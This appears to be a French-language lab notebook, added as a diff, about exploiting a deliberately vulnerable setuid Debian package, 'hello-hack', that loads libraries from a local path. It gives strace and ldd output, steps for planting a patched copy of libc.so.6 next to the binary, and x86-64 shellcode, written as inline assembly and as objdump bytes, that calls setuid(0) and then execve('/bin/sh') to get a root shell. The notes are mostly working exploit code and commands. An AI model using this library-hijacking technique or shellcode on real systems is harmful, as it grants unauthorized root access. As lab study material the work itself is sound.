@@ -1,0 +1,166 @@
+$ sudo dpkg -i hello-hack_1.0.0_amd64.deb
+
+$ strace ./hello-hack
+
+execve("./hello-hack", ["./hello-hack"], 0x7ffccfec7350 /* 43 vars */) = 0
+brk(NULL)                               = 0x55877e685000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./tls/x86_64/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./tls/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./x86_64/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "./libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=116805, ...}) = 0
+mmap(NULL, 116805, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb1e5d3a000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\320l\2\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=1820104, ...}) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb1e5d38000
+mmap(NULL, 1832568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb1e5b78000
+mprotect(0x7fb1e5b9d000, 1642496, PROT_NONE) = 0
+mmap(0x7fb1e5b9d000, 1339392, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7fb1e5b9d000
+mmap(0x7fb1e5ce4000, 299008, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16c000) = 0x7fb1e5ce4000
+mmap(0x7fb1e5d2e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b5000) = 0x7fb1e5d2e000
+mmap(0x7fb1e5d34000, 13944, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb1e5d34000
+close(3)                                = 0
+arch_prctl(ARCH_SET_FS, 0x7fb1e5d39500) = 0
+mprotect(0x7fb1e5d2e000, 12288, PROT_READ) = 0
+mprotect(0x55877d4d1000, 4096, PROT_READ) = 0
+mprotect(0x7fb1e5d7e000, 4096, PROT_READ) = 0
+munmap(0x7fb1e5d3a000, 116805)          = 0
+fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x5), ...}) = 0
+brk(NULL)                               = 0x55877e685000
+brk(0x55877e6a6000)                     = 0x55877e6a6000
+write(1, "hello!\n", 7hello!
+)                 = 7
+write(1, "\n", 1
+)                       = 1
+exit_group(8)                           = ?
++++ exited with 8 +++
+
+----------------------------------------------
+
+> ldd /sbin/hello-hack 
+	linux-vdso.so.1 (0x00007ffe22cec000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f97f3578000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f97f375c000)
+	
+a cause de l'option -rpath les librairies sont locales
+donc si on fait pointer un faux libc.so.6 il devrait executer le shellcode
+
+clement@kali:~/Desktop/pierre/assembly/3-hello-hack/hello-hack/debian/hello-hack$ sudo cp /lib/x86_64-linux-gnu/libc.so.6 ./
+clement@kali:~/Desktop/pierre/assembly/3-hello-hack/hello-hack/debian/hello-hack/sbin$ ls
+libc.so.6  hello-hack
+
+
+- LD_PRELOAD ne fonctionne pas car setuid
+- libattack -> libc ne fonctionne pas car le programme utilise pleins de fonctions de libc
+- modifier la libc ? patcher la libc
+
+$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
+809c0 IO_puts
+809c0 W_puts
+
+$ objdump /lib/x86_64-linux-gnu/libc.so.6
+
+- recherche d'un shellcode pour ouvrir un shell 
+setuid 0 
+exec /bin/sh
+
+> exploit-db.com/exploits/13320
+setuid = syscall 105
+execve = syscall 59
+
+donc on prend le shellcode et on l'insere dans le fichier shellcode.c
+> gcc -z execstack -o shellcode shellcode.c
+> sudo chown root shellcode (pas necessaire pr l'attaque)
+> sudo chmod 4755 shellcode  (pas necessaire pr l'attaque)
+
+> objdump -D /lib/x86_64-linux-gnu/libc.so.6 | less
+---> /
+> xxd /lib/x86_64-linux-gnu/libc.so.6 | less
+> on ecrit a la ligne 809c0 le shellcode dans ./libc.so.6 car le programme va chercher cette lib 
+
+> dans ....../sbin/ ./hello-hack
+
+malheureusement, on est pas encore root...
+il faut modifier le shellcode
+
+main(){
+__asm(  "xorq %rdi,%rdi\n\t"
+        "mov $0x69,%al\n\t" // modifier al en rax en 64 bits 
+        "syscall \n\t"
+        "xorq   %rdx, %rdx \n\t"
+        "movq   $0x68732f6e69622fff,%rbx; \n\t"
+        "shr    $0x8, %rbx; \n\t"
+        "push   %rbx; \n\t"
+        "movq   %rsp,%rdi; \n\t"
+        "xorq   %rax,%rax; \n\t"
+        "pushq  %rax; \n\t"
+        "pushq  %rdi; \n\t"
+        "movq   %rsp,%rsi; \n\t"
+        "mov    $0x3b,%al; \n\t"
+        "syscall ; \n\t"
+        /*"pushq  $0x1 ; \n\t"
+        "pop    %rdi ; \n\t"
+        "pushq  $0x3c ; \n\t"
+        "pop    %rax ; \n\t"
+        "syscall  ; \n\t"*/
+);
+}
+
+pour obtenir le binaire on cree un .s et on ouvre avec objdump
+
+on cree shellcode2.c
+puis gcc -o shellcode2 shellcode2.c
+objdump -D shellcode2
+
+0000000000001125 <shellcode>:
+    1125:	55                   	push   %rbp
+    1126:	48 89 e5             	mov    %rsp,%rbp
+    1129:	48 31 ff             	xor    %rdi,%rdi
+    112c:	48 c7 c0 69 00 00 00 	mov    $0x69,%rax
+    1133:	0f 05                	syscall 
+    1135:	48 31 d2             	xor    %rdx,%rdx
+    1138:	48 bb ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rbx
+    113f:	2f 73 68 
+    1142:	48 c1 eb 08          	shr    $0x8,%rbx
+    1146:	53                   	push   %rbx
+    1147:	48 89 e7             	mov    %rsp,%rdi
+    114a:	48 31 c0             	xor    %rax,%rax
+    114d:	50                   	push   %rax
+    114e:	57                   	push   %rdi
+    114f:	48 89 e6             	mov    %rsp,%rsi
+    1152:	b0 3b                	mov    $0x3b,%al
+    1154:	0f 05                	syscall 
+    1156:	6a 01                	pushq  $0x1
+    1158:	5f                   	pop    %rdi
+    1159:	6a 3c                	pushq  $0x3c
+    115b:	58                   	pop    %rax
+    115c:	0f 05                	syscall 
+    115e:	90                   	nop
+    115f:	5d                   	pop    %rbp
+    1160:	c3                   	retq   
+    
+on obtient donc : 
+	1129:	48 31 ff             	xor    %rdi,%rdi
+    112c:	48 c7 c0 69 00 00 00 	mov    $0x69,%rax
+    1133:	0f 05                	syscall 
+    1135:	48 31 d2             	xor    %rdx,%rdx
+    1138:	48 bb ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rbx
+    113f:	2f 73 68 
+    1142:	48 c1 eb 08          	shr    $0x8,%rbx
+    1146:	53                   	push   %rbx
+    1147:	48 89 e7             	mov    %rsp,%rdi
+    114a:	48 31 c0             	xor    %rax,%rax
+    114d:	50                   	push   %rax
+    114e:	57                   	push   %rdi
+    114f:	48 89 e6             	mov    %rsp,%rsi
+    1152:	b0 3b                	mov    $0x3b,%al
+    1154:	0f 05                	syscall 
+
